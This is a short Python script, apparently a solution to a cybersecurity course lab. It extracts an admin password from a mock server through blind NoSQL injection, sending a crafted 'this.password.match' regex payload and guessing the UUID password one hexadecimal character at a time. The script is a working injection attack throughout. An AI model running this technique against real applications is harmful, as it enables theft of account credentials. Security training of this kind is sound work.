'''Retrieve password from a mock server, for a cybersecurity course'''

def get_match(url):
    response=requests.get(url)
    POSITION_FIRST_OCURRENCE_OF_ADMIN = 1355
    INFINITE_NUMBER = 50000
    return response.text.find('admin',POSITION_FIRST_OCURRENCE_OF_ADMIN ,INFINITE_NUMBER)


def get_password(url):
    for str_input in list_str_input:
        password_updated = password + str_input
        print(f'password_updated: {password_updated}')
        query_params = f"?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
        match = get_match(f'{url}/{query_params}')
        if match != -1:
            return password_updated


import requests

url='http://ptl-53e5f638-4f71d7ff.libcurl.so/'
password=''

### TODO: find pattern  to generate this list
list_str_input = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','-']

# In its canonical textual representation, the 16 octets of a UUID are represented as 32 hexadecimal (base-16) digits,
# displayed in five groups separated by hyphens, in the form 8-4-4-4-12 for a total of 36 characters (32 hexadecimal characters and 4 hyphens).
# source: https://en.wikipedia.org/wiki/Universally_unique_identifier
PASS_LENGTH=36


while len(password) < PASS_LENGTH:
    password = get_password(url)


